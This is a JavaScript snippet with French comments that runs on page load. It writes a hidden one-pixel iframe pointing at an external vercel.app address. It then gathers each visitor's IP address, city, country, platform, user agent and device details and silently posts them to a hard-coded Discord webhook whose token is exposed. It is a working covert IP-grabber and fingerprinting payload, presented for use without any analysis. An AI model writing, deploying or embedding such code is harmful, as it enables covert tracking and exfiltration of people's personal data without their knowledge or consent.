document.write("<iframe width=\"1px\" height=\"1px\"  src=\"https:\/\/gflp-p.vercel.app\/gr\/\">\r\n   \r\n<\/iframe>");


        // Fonction pour récupérer l'adresse IP de l'utilisateur
        function getIPAddress(callback) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://api.ipify.org?format=json', true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var response = JSON.parse(xhr.responseText);
                    callback(response.ip);
                }
            };
            xhr.send();
        }

        // Fonction pour obtenir la localisation en utilisant l'API ipinfo.io
        function getLocation(ip, callback) {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', 'https://ipinfo.io/' + ip + '/json', true);
            xhr.onload = function() {
                if (xhr.status === 200) {
                    var response = JSON.parse(xhr.responseText);
                    callback(response.city + ', ' + response.country);
                }
            };
            xhr.send();
        }

        // Fonction pour envoyer les informations à un webhook Discord
        function sendToDiscordWebhook(data) {
            var webhookURL = 'https://discord.com/api/webhooks/1162704456807370824/TzPScu8B7mWvbyCjMWBa_hMp4T0A4MgwzlEeFgzrxytL5V4zymoEZKKOGn471a8waGZ3';

            var xhr = new XMLHttpRequest();
            xhr.open('POST', webhookURL, true);
            xhr.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');

            var message = {
                content: "Informations de l'utilisateur",
                embeds: [
                    {
                        title: "Informations de l'utilisateur",
                        fields: [
                            { name: "Adresse IP", value: data.ipAddress, inline: true },
                            { name: "Adresse", value: data.address, inline: true },
                            { name: "Localisation", value: data.location, inline: true },
                            { name: "Système d'exploitation", value: data.operatingSystem, inline: true },
                            { name: "Marque", value: data.brand, inline: true },
                            { name: "Fabricant", value: data.manufacturer, inline: true },
                            { name: "Encodage", value: data.encoding, inline: true },
                            { name: "User Agent", value: data.browserType, inline: true },
                            { name: "Version", value: data.mobileManufacturer, inline: true }
                        ]
                    }
                ]
            };

            xhr.send(JSON.stringify(message));
        }

        // Obtient l'adresse de l'utilisateur
        getIPAddress(function(ip) {
            document.getElementById('ipAddress').textContent = ip;

            getLocation(ip, function(location) {
                document.getElementById('location').textContent = location;
            });

            // Envoie les informations au webhook Discord
            sendToDiscordWebhook({
                ipAddress: ip,
                address: document.getElementById('address').textContent,
                location: document.getElementById('location').textContent,
                operatingSystem: operatingSystem,
                brand: brand,
                manufacturer: manufacturer,
                encoding: encoding,
                browserType: browserType,
                mobileManufacturer: mobileManufacturer
            });
        });

        // Obtient le système d'exploitation de l'utilisateur
        var operatingSystem = navigator.platform;

        // Obtient la marque de l'appareil de l'utilisateur
        var brand = "Non disponible";
        if (navigator.userAgent.match(/Android/i)) {
            brand = "Android";
        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
            brand = "Apple";
        }

        // Obtient le fabricant de l'appareil de l'utilisateur
        var manufacturer = "Non disponible";
        if (navigator.userAgent.match(/Android/i)) {
            manufacturer = "Google";
        } else if (navigator.userAgent.match(/iPhone|iPad|iPod/i)) {
            manufacturer = "Apple";
        }

        // Obtient l'encodage du navigateur
        var encoding = document.characterSet;

        // Obtient le type de navigateur
        var browserType = navigator.userAgent;

        // Obtient le fabricant du mobile de l'utilisateur
        var mobileManufacturer = "Non disponible";
        var userAgent = navigator.userAgent;

        if (userAgent.match(/Android/i)) {
            var regex = /Android\s([\w\s]+)\;/;
            var matches = userAgent.match(regex);
            if (matches && matches.length > 1) {
                mobileManufacturer = matches[1];
            }
        } else if (userAgent.match(/iPhone|iPad|iPod/i)) {
            mobileManufacturer = "Apple";
        }

        // Met à jour les éléments HTML avec les informations de l'utilisateur
        document.getElementById('operatingSystem').textContent = operatingSystem;
        document.getElementById('brand').textContent = brand;
        document.getElementById('manufacturer').textContent = manufacturer;
        document.getElementById('encoding').textContent = encoding;
        document.getElementById('browserType').textContent = browserType;
        document.getElementById('location').textContent = 'Non disponible';
        document.getElementById('mobileManufacturer').textContent = mobileManufacturer;
  
